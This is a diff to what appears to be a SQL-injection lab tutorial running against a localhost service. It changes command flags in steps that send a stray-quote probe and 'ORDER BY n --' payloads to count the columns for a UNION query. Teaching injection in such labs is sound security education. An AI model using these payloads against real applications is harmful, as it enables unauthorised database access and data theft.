@@ -5,7 +5,7 @@
 One quote.
 
 ```bash
-h5i browser open 'http://127.0.0.1:9120/api/products?q=compass' --session lab12 --new --capture
+h5i browser open 'http://127.0.0.1:9120/api/products?q=compass' --session lab12 --new
 h5i websec replay req_0 --session lab12 --set "query.q=compass'"
 h5i websec show res_1 --session lab12 --raw
 ```
@@ -37,7 +37,7 @@ A `UNION` demands that both sides have the same number of columns. Find it with
 ```bash
 for n in 1 2 3 4 5; do
   printf '%d ' $n
-  h5i websec replay req_0 --session lab12 --reset-budget \
+  h5i websec replay req_0 --session lab12 --json --reset-budget \
       --set "query.q=zz%' ORDER BY $n -- " |
     python3 -c 'import json,sys;print(json.load(sys.stdin)["response"]["status"])'
 done
